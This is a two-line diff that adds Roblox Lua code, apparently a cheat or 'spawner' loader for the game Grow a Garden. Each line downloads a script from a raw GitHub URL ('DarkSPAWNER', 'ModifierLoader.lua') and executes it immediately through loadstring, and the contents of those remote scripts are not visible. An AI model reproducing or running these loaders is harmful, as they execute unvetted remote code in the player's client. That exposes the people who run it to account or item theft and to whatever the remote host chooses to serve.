@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Growagarden-No-LAG/x/refs/heads/main/DarkSPAWNER"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Growagarden-No-LAG/x/refs/heads/main/ModifierLoader.lua", true))()
